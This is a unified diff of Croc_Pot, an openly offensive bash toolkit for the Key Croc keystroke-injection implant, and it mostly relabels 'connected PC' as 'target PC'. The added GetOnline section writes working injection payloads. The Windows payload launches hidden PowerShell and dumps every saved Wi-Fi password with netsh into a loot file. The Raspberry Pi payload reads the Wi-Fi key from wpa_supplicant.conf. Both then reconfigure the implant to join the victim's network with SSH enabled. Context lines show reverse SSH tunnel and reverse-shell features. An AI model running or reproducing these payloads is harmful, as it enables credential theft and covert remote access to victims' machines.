@@ -4,7 +4,7 @@
 # Title:         Croc_Pot
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.4.7
+# Version:       1.4.8
 # Category:      Key Croc
 ##
 ##
@@ -93,7 +93,7 @@ fi
 \e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(internet_test)         ${clear}
 \e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)   $(FILL_IN)${clear}
 \e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.4.7\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.4.8\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"	
 }
 function croc_title_loot() {
@@ -139,7 +139,7 @@ function nmap_menu() {
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
 	echo -ne "$(Info_Screen '
 -Start some basic nmap scan and save to loot folder\n
--Enter IP for scan or default will be target pc ip')$(os_ip)\n${clear}\n"
+-Enter IP for scan or default will be target pc ip ' $(os_ip))${clear}\n"
 ##
 #----Nmap User IP Input Function
 ##
@@ -216,16 +216,16 @@ personal_scan() {
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PERSONAL SCAN${LINE_}\n" ; echo -n " $(ColorBlue 'ENTER YOUR NMAP SCAN SETTING THEN PRESS [ENTER]'): " ; read PER_SCAN && ${PER_SCAN} | tee -a ${LOOT_NMAP}
 }
 ##
-#----Nmap Connected Pc Scan Function
+#----Nmap Target Pc Scan Function
 ##
 pc_scan() {
 if [ "$(OS_CHECK)" = WINDOWS ]; then
-	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
+	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}TARGET PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
 else
 if [ "$(OS_CHECK)" = LINUX ]; then
-	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
+	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}TARGET PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
 else
-	echo -ne "\n\t\e[40m$(ColorRed 'PLEASE RUN CROC_POT_PAYLOAD.txt TO GET PC USER NAME AND IP')${clear}\n"
+	echo -ne "\n\t\e[40m$(ColorRed 'PLEASE RUN CROC_POT_PAYLOAD.txt TO GET TARGET PC USER NAME AND IP')${clear}\n"
 fi
 fi
 }
@@ -242,7 +242,7 @@ MenuColor 5 INTENSE SCAN ; echo -ne "      ${clear}\n"
 MenuColor 6 INTERFACE SCAN ; echo -ne "    ${clear}\n"
 MenuColor 7 PORT SCAN ; echo -ne "         ${clear}\n"
 MenuColor 8 PERSONAL SCAN ; echo -ne "     ${clear}\n"
-MenuColor 9 CONNECTED PC SCAN ; echo -ne "  ${clear}\n"
+MenuColor 9 TARGET PC SCAN ; echo -ne "     ${clear}\n"
 MenuColor 10 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
 MenuEnd
 	unset m_a
@@ -771,26 +771,75 @@ fi
 ##
 get_online_p() {
 	clear
-	local GETONLINE=/root/udisk/payloads/Getonline.txt
+	local GETONLINE_WINDOWS=/root/udisk/payloads/Getonline_Windows.txt
+	local GETONLINE_LINUX=/root/udisk/payloads/Getonline_Linux.txt
+	local GETONLINE_RASPBERRY=/root/udisk/payloads/Getonline_Raspberry.txt
 	echo -ne "$(Info_Screen '
--Connect automatically to target pc WIFI (Windows)\n
--After install unplug and plug into windows pc and type in getonline\n
+-Payload Called GetOnline\n 
+-Connect automatically to target pc WIFI (Windows/Linux/Raspberry)\n
+-After install unplug and plug into target pc and type in below\n
+getonline <-- for windows or linuxonline <-- for Linux or\n
+rasponline <-- for Raspberry pi\n
 -When done the led will light up green unplug keycroc and plug back in\n
--The keycroc should now be connected to the target pc wifi\n')${clear}\n"
-if [ -e "${GETONLINE}" ]; then
-	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
+-The keycroc should now be connected to the target pc wifi\n')${clear}\n\n"
+##
+#----Getonline Windows payload
+##
+if [ -e "${GETONLINE_WINDOWS}" ]; then
+	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE WINDOWS PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
 else
-	local GET_ON='label=\"KeyCroc\"'
-	local GET_ON_A='\$Croc'
-	echo -e "# Title:           Windows Get online\n# Description:     Get online automatically to target pc wifi or to your own wifi\n# Author:          spywill / RootJunky\n# Version:         2.3\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong\n#\n#" >> ${GETONLINE}
-	echo -e "MATCH getonline\nQ LOCK\n# --> udisk unmount\nATTACKMODE HID STORAGE\nsleep 5\nLED ATTACK\nQ GUI r\nsleep 1\n# --> Open powershell\nQ STRING \"powershell -NoP -NonI -W Hidden\"\nQ ENTER\nsleep 2\n# --> Get KeyCroc drive\nQ STRING \"${GET_ON_A} = (gwmi win32_volume -f '${GET_ON}' | Select-Object -ExpandProperty DriveLetter)\"" >> ${GETONLINE}
-	echo -e "Q ENTER\nsleep 2\n# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder" >> ${GETONLINE}
-	printf '%s\n' 'Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Out-File -Encoding UTF8 \"\$Croc\loot\Croc_Pot\wifipass.txt\""' >> ${GETONLINE}
-	echo -e "Q ENTER\nsleep 2\nQ STRING \"exit\"\nQ ENTER\n# --> Returning to HID Mode\nATTACKMODE HID\nsleep 3\nLED SETUP\n# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove r end lines in config.txt file" >> ${GETONLINE}
-	echo "\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/loot/Croc_Pot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' -e 's/\r//g' root/udisk/config.txt)" >> ${GETONLINE}
-	echo -e "sleep 2\nQ UNLOCK\nLED FINISH" >> ${GETONLINE}
-	echo ""
-	echo -ne "\n\e[40m${red}***${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n"
+	read_all INSTALL GETONLINE PAYLOAD FOR WINDOWS Y/N AND PRESS [ENTER]
+	case $r_a in
+	[yY] | [yY][eE][sS])
+		echo -ne "# Title:           Windows Get online\n# Description:     Get online automatically to target pc wifi or to your own wifi\n# Author:          spywill / RootJunky\n# Version:         2.3\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong
+#\nMATCH getonline\nQ LOCK\n# --> udisk unmount\nATTACKMODE HID STORAGE\nsleep 5\nLED ATTACK\nQ GUI r\nsleep 1\n# --> Open powershell\nQ STRING \"powershell -NoP -NonI -W Hidden\"\nQ ENTER\nsleep 2\n# --> Get KeyCroc drive
+Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"\nQ ENTER\nsleep 2\n# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
+Q STRING \"(netsh wlan show networks) | Select-String \\\"\:(.+)\\\$\\\" | % {\\\$name=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{(netsh wlan show profile name=\\\"\\\$name\\\" key=clear)} | Select-String \\\"Key Content\W+\:(.+)\\\$\\\" | % {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{[PSCustomObject]@{ PROFILE_NAME=\\\$name;PASSWORD=\\\$pass }} | Out-File -Encoding UTF8 \\\"\$Croc\loot\\\Croc_Pot\wifipass.txt\\\"\"
+Q ENTER\nsleep 2\nQ STRING \"exit\"\nQ ENTER\n# --> Returning to HID Mode\nATTACKMODE HID\nsleep 3\nLED SETUP\n# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove r end lines in config.txt file
+\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/loot/Croc_Pot/wifipass.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' -e 's/\\\r//g' root/udisk/config.txt)\nsleep 2\nQ UNLOCK\nLED FINISH" >> ${GETONLINE_WINDOWS}
+		echo -ne "\n\e[40m${red}***${clear}\e[40m$(ColorGreen 'GETONLINE WINDOWS PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n" ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ;;
+	esac
+fi
+##
+#----Getonline Linux payload
+##
+if [ -e "${GETONLINE_LINUX}" ]; then
+	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE LINUX PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
+else
+	read_all INSTALL GETONLINE PAYLOAD FOR LINUX Y/N AND PRESS [ENTER]
+	case $r_a in
+	[yY] | [yY][eE][sS])
+		echo -ne "\n\e[40m$(ColorYellow 'Sorry still In Development for Linux')\n${clear}" ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ;;
+	esac
+fi
+##
+#----Getonline Raspberry pi payload
+##
+if [ -e "${GETONLINE_RASPBERRY}" ]; then
+		echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE RASPBERRY PI PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
+else
+	read_all INSTALL GETONLINE PAYLOAD FOR RASPBERRY PI Y/N AND PRESS [ENTER]
+	case $r_a in
+	[yY] | [yY][eE][sS])
+		echo -ne "# Title:           Raspberry PI Get online\n# Description:     Get online automatically to target pc wifi or to your own wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n#\nMATCH rasponline\n#\nrm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE
+LED ATTACK\n# --> start target pc terminal\nQ GUI d\nsleep 1\nQ STRING \"terminal\"\nQ ENTER\nQ ENTER\nsleep 1\n# --> Get KeyCroc drive\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n# --> Get Target current ssid (Wifi)\nQ STRING \"t_ssid=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"
+Q ENTER\nsleep 1\n# --> Get Target wifi passwd\nQ STRING \"t_pw=\\\$(sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$t_ssid/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"\nQ ENTER\nsleep 1\n# --> Save ssid & passwd to keycroc\nQ STRING \"echo \\\$t_ssid \\\$t_pw >> \\\${LINUX_ON}\"
+Q ENTER\nsleep 3\nQ STRING \"exit\"\nQ ENTER\nATTACKMODE HID\nsleep 5\nRemone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed
+\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/Linux_GetOnline.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt)\nLED FINISH" >> ${GETONLINE_RASPBERRY}
+		echo -ne "\n\e[40m${red}***${clear}\e[40m$(ColorGreen 'GETONLINE RASPBERRY PI PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n" ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ;;
+	esac
 fi
 }
 ##
@@ -3593,7 +3642,7 @@ fi
 ##
 screen_shot() {
 	echo -ne "$(Info_Screen '
--Option to install Croc_Shot.txt payload this will take screenshot of pc\n
+-Option to install Croc_Shot.txt payload this will take screenshot of Target pc\n
 -To start the Croc_Shot payload type in crocshot\n
 -This will save to loot/Croc_pot/screenshot\n
 -Option to take screenshot now\n
@@ -3637,7 +3686,7 @@ fi
 ##
 #----Croc_Shot take pic now function
 ##
-read_all TAKE SCREENSHOT NOW Y/N AND PRESS [ENTER]
+read_all TAKE SCREENSHOT NOW OF TARGET PC Y/N AND PRESS [ENTER]
 case $r_a in
 	[yY] | [yY][eE][sS])
 	ATTACKMODE HID STORAGE
@@ -3746,18 +3795,18 @@ esac
 menu_B() {
 	LED B
 MenuTitle CROC POT PLUS MENU
-MenuColor 1 TCPDUMP SCAN ; echo -ne "             ${clear}\n"
-MenuColor 2 KEYSTORKES LAPTOP WINDOWS ; echo -ne " ${clear}\n"
-MenuColor 3 GETONLINE PAYLOAD WINDOWS ; echo -ne " ${clear}\n"
-MenuColor 4 CROCUNLOCK PAYLOAD WINDOWS ; echo -ne "${clear}\n"
-MenuColor 5 WIFI SETUP PAYLOAD ; echo -ne "        ${clear}\n"
-MenuColor 6 NMAP SCAN ; echo -ne "                ${clear}\n"
-MenuColor 7 WINDOWS INFO SCAN ; echo -ne "         ${clear}\n"
-MenuColor 8 CROC VPN SETUP ; echo -ne "            ${clear}\n"
-MenuColor 9 PASS TIME GAMES ; echo -ne "           ${clear}\n"
-MenuColor 10 WINDOWS DEFENDER ; echo -ne "        ${clear}\n"
-MenuColor 11 TAKE SCREENSHOT ; echo -ne "         ${clear}\n"
-MenuColor 12 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
+MenuColor 1 TCPDUMP SCAN ; echo -ne "      ${clear}\n"
+MenuColor 2 KEYSTORKES LAPTOP  ; echo -ne " ${clear}\n"
+MenuColor 3 GETONLINE PAYLOAD  ; echo -ne " ${clear}\n"
+MenuColor 4 CROCUNLOCK PAYLOAD  ; echo -ne "${clear}\n"
+MenuColor 5 WIFI SETUP PAYLOAD ; echo -ne " ${clear}\n"
+MenuColor 6 NMAP SCAN ; echo -ne "         ${clear}\n"
+MenuColor 7 WINDOWS INFO SCAN ; echo -ne "  ${clear}\n"
+MenuColor 8 CROC VPN SETUP ; echo -ne "     ${clear}\n"
+MenuColor 9 PASS TIME GAMES ; echo -ne "    ${clear}\n"
+MenuColor 10 WINDOWS DEFENDER ; echo -ne " ${clear}\n"
+MenuColor 11 TAKE SCREENSHOT ; echo -ne "  ${clear}\n"
+MenuColor 12 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
 MenuEnd
 	unset m_a
 	read m_a
@@ -3842,23 +3891,23 @@ pc_info() {
 	local CROC_OS_TARGET=/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(OS_CHECK)
-$(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
+$(ColorYellow 'Target PC Host name is:') $(sed -n 3p ${CROC_OS})
 $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
-$(ColorYellow 'Pc user name is:') $(sed -n 1p ${CROC_OS_TARGET})
-$(ColorYellow 'Pc IP is:') $(sed '2,6!d' ${CROC_OS_TARGET})
-$(ColorYellow 'Pc SSID + PASSWD and MAC address is:')
+$(ColorYellow 'Target Pc user name is:') $(sed -n 1p ${CROC_OS_TARGET})
+$(ColorYellow 'Target Pc IP is:') $(sed '2,6!d' ${CROC_OS_TARGET})
+$(ColorYellow 'Target Pc SSID + PASSWD and MAC address is:')
 $(sed '9,24!d' ${CROC_OS_TARGET})\n"
 else
 if [ "$(OS_CHECK)" = LINUX ]; then
 echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(OS_CHECK)
-$(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
+$(ColorYellow 'Target PC Host name is:') $(sed -n 3p ${CROC_OS})
 $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
-$(ColorYellow 'Pc user name is:') $(sed -n 1p ${CROC_OS_TARGET})
-$(ColorYellow 'Pc IP is:') $(sed -n '2,3p' ${CROC_OS_TARGET})
-$(ColorYellow 'Pc SSID + PASSWD and MAC address is:') 
+$(ColorYellow 'Target Pc user name is:') $(sed -n 1p ${CROC_OS_TARGET})
+$(ColorYellow 'Target Pc IP is:') $(sed -n '2,3p' ${CROC_OS_TARGET})
+$(ColorYellow 'Target Pc SSID + PASSWD and MAC address is:') 
 $(sed '4,20!d' ${CROC_OS_TARGET})\n"
 else
-	echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')"
+	echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET TARGET PC USER NAME AND IP')"
 fi
 fi
 }
@@ -3906,7 +3955,7 @@ MenuColor 3 NUMBER OF TCP CONNECTIONS ; echo -ne "  ${clear}\n"
 MenuColor 4 KERNEL VERSION ; echo -ne "           ${clear}\n"
 MenuColor 5 RUNNING PROCESSES ; echo -ne "        ${clear}\n"
 MenuColor 6 CHECK ALL ; echo -ne "                ${clear}\n"
-MenuColor 7 CONNECTED PC INFO ; echo -ne "         ${clear}\n"
+MenuColor 7 TARGET PC INFO ; echo -ne "            ${clear}\n"
 MenuColor 8 VIEW LIVE KEYSTORKES ; echo -ne "      ${clear}\n"
 MenuColor 9 START NMON MONITORING ; echo -ne "     ${clear}\n"
 MenuColor 10 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
@@ -4137,7 +4186,7 @@ function ssh_menu() {
 ##
 check_device() {
 if ping -q -c1 -w1 ${1} &>/dev/null 2>&1; then
-	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;32mCONNECTED IP:${1} ${clear}${4} ${5}" >&2
+	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;32mONLINE IP:${1} ${clear}${4} ${5}" >&2
 else
 	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;31mNOT CONNECTED OR CAN'T BE REACHED ${clear}" >&2
 fi
@@ -4176,9 +4225,9 @@ public_ip() {
 port_check() {
 nc -z -v -w1 ${1} 22 &>/dev/null 2>&1
 if [[ "$?" -ne 0 ]]; then
-	echo -ne "\e[40;93m Port:${clear}\e[40;31m$PORT closed${clear}\n"
+	echo -ne "\e[40;93m Port:${clear}\e[40;31m22 closed${clear}\n"
 elif [[ "${#args[@]}" -eq 0 ]]; then
-	echo -ne "\e[40;93m Port:${clear}\e[40;32m$PORT open${clear}\n"
+	echo -ne "\e[40;93m Port:${clear}\e[40;32m22 open${clear}\n"
 fi
 }
 ##
@@ -4189,10 +4238,10 @@ get_mac () {
 }
 	echo -ne "$(Info_Screen '
 -SSH into your HAK5 gear\n
--SSH into connect PC\n
--Reverse ssh tunnel\n
+-SSH into TARGET PC\n
+-Reverse ssh tunnel, Create SSH Public/Private Key\n
 -Ensure your devices are connected to the same local network As keycroc\n')${clear}\n"
-check_device $(os_ip) CONNECTED PC: $(public_ip) ; port_check $(os_ip)
+check_device $(os_ip) TARGET PC: $(public_ip) ; port_check $(os_ip)
 check_device 172.16.42.1 WIFI PINEAPPLE: ; get_mac 172.16.42.1 ; port_check 172.16.42.1
 check_device 172.16.32.1 SQUIRREL : ; get_mac 172.16.32.1 ; port_check 172.16.32.1
 check_device 172.16.84.1 TURTLE : ; get_mac 172.16.84.1 ; port_check 172.16.84.1
@@ -4392,7 +4441,7 @@ fi
 ssh_bunny() {
 	clear
 	echo -ne "$(Info_Screen '
--Start ssh with connected PC to Bash bunny or\n
+-Start ssh with Target PC to Bash bunny or\n
 -Start REVERSE SHELL Tunnel with keycroc to bash bunny\n
 -Will need a small payload install on bash bunny\n
 -This will create the payload for the bash bunny and save it to tools folder\n
@@ -4426,7 +4475,7 @@ else
 # Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
 		echo -ne "\n\e[40m${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n${clear}"
 fi
-	read_all START SSH WITH CONNECTED PC TO BUNNY Y/N AND PRESS [ENTER]
+	read_all START SSH WITH TARGET PC TO BUNNY Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
 if [ "$(OS_CHECK)" = WINDOWS ]; then
@@ -4472,6 +4521,7 @@ else
 	esac
 fi ;;
 	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}"
 		read_all START REVERSE TUNNEL WITH BUNNY TO CROC Y/N AND PRESS [ENTER]
 		case $r_a in
 	[yY] | [yY][eE][sS])
@@ -4683,14 +4733,14 @@ reverse_payload() {
 shell_pc() {
 	clear
 	echo -ne "$(Info_Screen '
--Start reverse ssh tunnel PC to Keycroc\n
+-Start reverse ssh tunnel Target PC to Keycroc\n
 -PC side will be setup with this below\n
 -\e[40;32mssh -fN -R port#:localhost:22 root@keycroc IP\e[0m\e[40;93m\n
 -Keycroc side will be setup with this below\n
 -\e[40;32mssh PC-username@localhost -p port#\e[0m\n')${clear}\n\n"
 	pc_pw
 if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
-	read_all START REVERSE SSH TUNNEL PC TO KEYCROC Y/N AND PRESS [ENTER]
+	read_all START REVERSE SSH TUNNEL TARGET PC TO KEYCROC Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
 	read_all ENTER PORT NUMBER YOU WOULD LIKE TO USE AND PRESS [ENTER]
@@ -4814,7 +4864,7 @@ MenuTitle REVERSE SHELL MENU
 MenuColor 1 SERVER LISTENER ; echo -ne "  ${clear}\n"
 MenuColor 2 CROC LISTENER ; echo -ne "    ${clear}\n"
 MenuColor 3 SHELL PAYLOAD ; echo -ne "    ${clear}\n"
-MenuColor 4 CONNECTED PC SHELL ; echo -ne "${clear}\n"
+MenuColor 4 TARGET PC SHELL ; echo -ne "   ${clear}\n"
 MenuColor 5 REVERSE SSH TUNNEL ; echo -ne "${clear}\n"
 MenuColor 6 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
 MenuEnd
@@ -4856,7 +4906,7 @@ remove_sshkey() {
 ##
 	LED B
 MenuTitle CROC SSH MENU
-MenuColor 1 START SSH WITH CONNECT PC ; echo -ne "   ${clear}\n"
+MenuColor 1 START SSH WITH TARGET PC ; echo -ne "    ${clear}\n"
 MenuColor 2 START SSH WITH USER INPUT ; echo -ne "   ${clear}\n"
 MenuColor 3 ENABLE_SSH ; echo -ne "              ${clear}\n"
 MenuColor 4 DISABLE_SSH ; echo -ne "             ${clear}\n"
@@ -5045,8 +5095,8 @@ remove_croc_pot() {
 		rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service
 		rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
 		rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
-		rm /root/udisk/payloads/Getonline.txt /root/udisk/payloads/Quick_Start_C2.txt
-		rm /root/udisk/payloads/Quick_start_Croc_Pot.txt
+		rm /root/udisk/payloads/Getonline_Raspberry.txt /root/udisk/payloads/Quick_Start_C2.txt
+		rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Getonline_Windows.txt
 		rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
 		rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt /root/udisk/payloads/Croc_Shell.txt
 		apt-get autoremove
